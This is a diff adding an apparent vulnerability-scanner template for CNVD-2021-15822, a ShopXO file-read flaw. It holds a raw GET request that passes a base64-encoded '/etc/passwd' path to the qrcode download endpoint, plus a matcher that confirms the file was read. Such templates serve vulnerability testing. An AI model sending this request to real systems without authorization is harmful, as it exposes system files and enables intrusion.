@@ -1,0 +1,26 @@
+id: CNVD-2021-15822
+info:
+  author: pikpikcu
+  name: ShopXO Download File Read
+  reference: https://mp.weixin.qq.com/s/69cDWCDoVXRhehqaHPgYog
+  severity: high
+  tags: shopxo,lfi
+requests:
+- matchers:
+  - regex:
+    - root:[x*]:0:0
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  raw:
+  - 'GET /public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q=  HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+
+    Content-Type: application/x-www-form-urlencoded
+
+    '
